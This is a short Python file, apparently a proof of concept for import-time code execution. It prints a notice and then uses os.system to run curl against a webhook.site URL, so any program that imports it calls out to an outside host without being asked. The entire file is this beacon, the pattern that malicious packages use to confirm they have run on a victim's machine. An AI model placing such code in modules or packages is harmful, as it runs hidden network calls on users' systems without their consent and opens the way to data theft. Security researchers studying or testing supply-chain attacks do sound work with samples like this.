import os

print("[*] Code running at import time...")
os.system("curl https://webhook.site/3a45291b-4331-4008-8191-c5c9200be954")